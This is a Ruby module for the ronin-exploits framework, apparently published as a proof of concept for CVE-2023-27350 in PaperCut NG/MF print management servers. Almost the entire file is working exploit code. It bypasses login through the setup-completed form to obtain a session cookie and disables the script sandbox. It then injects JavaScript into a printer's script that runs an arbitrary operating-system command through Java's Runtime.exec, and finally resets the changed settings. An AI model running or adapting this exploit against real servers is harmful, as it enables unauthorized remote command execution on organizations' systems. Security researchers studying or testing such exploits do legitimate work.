#!/usr/bin/env -S ronin-exploits run -f

require 'ronin/exploits/web'
require 'ronin/exploits/mixins/has_payload'
require 'ronin/payloads/command_payload'

module Ronin
  module Exploits
    #
    # An example [ronin exploit] for [CVE-2023-27350].
    #
    # [CVE-2023-27350]: https://nvd.nist.gov/vuln/detail/CVE-2023-27350
    #
    # @see https://github.com/ronin-rb/ronin-exploits#readme
    #
    class CVE_2023_27350 < Web

      include Mixins::HasPayload

      register 'CVE-2023-27350'

      quality :poc
      release_date    '2023-06-09'
      disclosure_date '2023-04-20'
      advisory 'CVE-2023-27350'

      author 'postmodern', email: 'postmodern.mod3@gmail.com'
      summary "PaperCut NG/MF Authentication Bypass and Code/Command Execution"
      description <<~DESC
        PaperCut MG and NF versions 8.0.0 - 22.0.5 are vulnerable to an
        authentication bypass that allows an attacker to execute arbitrary
        JavaScript via PaperCut's bundled RhinoJS engine, and then achieve
        command execution by calling `java.lang.Runtime.getRuntime().exec(...)`.
      DESC
      references [
        "https://www.papercut.com/kb/Main/PO-1216-and-PO-1219",
        'https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/',
        "https://github.com/horizon3ai/CVE-2023-27350#readme"
      ]

      software 'PaperCut MF/NG'
      software_versions '8.0.0'..'22.0.5'

      payload_class Payloads::CommandPayload

      #
      # Tests whether the remote website specified by `base_url` is vulnerable.
      #
      # @return [Ronin::Exploits::Test::Vulnerable,
      #          Ronin::Exploits::Test::NotVulnerable]
      #
      def test
        if get_session_id
          Vulnerable('vulnerable PaperCut instance detected')
        else
          NotVulnerable('did not receive a valid response or JSESSIONID cookie')
        end
      end

      #
      # Launches the exploit.
      #
      def launch
        unless (session_id = get_session_id)
          fail("failed to obtain the JSESSIONID cookie")
        end

        # set the JSESSIONID cookie for further requests
        http.cookie = session_id

        # set the Origin header for all further requests
        http.headers['Origin'] = params[:base_url].to_s

        set_setting('print-and-device.script.enabled','Y')
        set_setting('print.script.sandboxed','N')

        http_get('/app?service=page/PrinterList', form_data: {
          'service' => 'page/PrinterList'
        })

        http_get('/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', form_data: {
          'service' => 'direct/1/PrinterList/selectPrinter',
          'sp'      => 'l1001'
        })

        http_get('/app', form_data: {
          'service' => 'direct/1/PrinterDetails/printerOptionsTab.tab',
          'sp'      => '4'
        })

        js_payload = [
          "function printJobHook(inputs, actions) {}",
          "java.lang.Runtime.getRuntime().exec('#{payload}');"
        ].join("\r\n")

        response = http_post('/app', form_data: {
          'service' => 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
          'sp'      => 'S0',
          'Form0'   => 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
          'printerId'         => 'l1001',
          'enablePrintScript' => 'on',
          'scriptBody'        => js_payload,
          '$Submit$1'         => 'Apply',
        })

        if response.code == '200' &&
           response.body.include?('Saved successfully')
          print_success "Successfully executed command!"
        else
          print_failure "Failed to correctly execute command."
          print_info    "Try checking the printer configuration."
        end
      end

      #
      # Cleans up after the exploit.
      #
      def cleanup
        print_info "Resetting settings back to their original values ..."

        set_setting('print-and-device.script.enabled','N')
        set_setting('print.script.sandboxed','Y')
      end

      #
      # Attempts to authenticate with the PaperCut app and return the
      # `JSESSIONID`.
      #
      # @return [String, nil]
      #
      def get_session_id
        print_info "Attempting to obtain JSESSIONID ..."

        http_get('/app?service=page/SetupCompleted')

        response = http_post('/app', form_data: {
          'service' => 'direct/1/SetupCompleted/$Form',
          'sp'      => 'S0',
          'Form0'   => '$Hidden,analyticsEnabled,$Submit',
          '$Hidden' => 'true',
          '$Submit' => 'Login'
        })

        if response.code == '200' && response.body.include?('papercut')
          set_cookie = response['Set-Cookie']

          if set_cookie && (match = set_cookie.match(/JSESSIONID=[^;]+/))
            return match[0]
          end
        end
      end

      #
      # Changes a setting in the PaperCut app.
      #
      # @param [String] name
      #   The setting name.
      #
      # @param [String] value
      #   The new setting value.
      #
      def set_setting(name,value)
        print_info "Updating setting #{name} to #{value} ..."

        http_post('/app', form_data: {
          'service'     => 'direct/1/ConfigEditor/quickFindForm',
          'sp'          => 'S0',
          'Form0'       => '$TextField,doQuickFind,clear',
          '$TextField'  => name,
          'doQuickFind' => 'Go'
        })

        http_post('/app', form_data: {
          'service'      => 'direct/1/ConfigEditor/$Form',
          'sp'           => 'S1',
          'Form1'        => '$TextField$0,$Submit,$Submit$0',
          '$TextField$0' => value,
          '$Submit'      => 'Update'
        })
      end

    end
  end
end
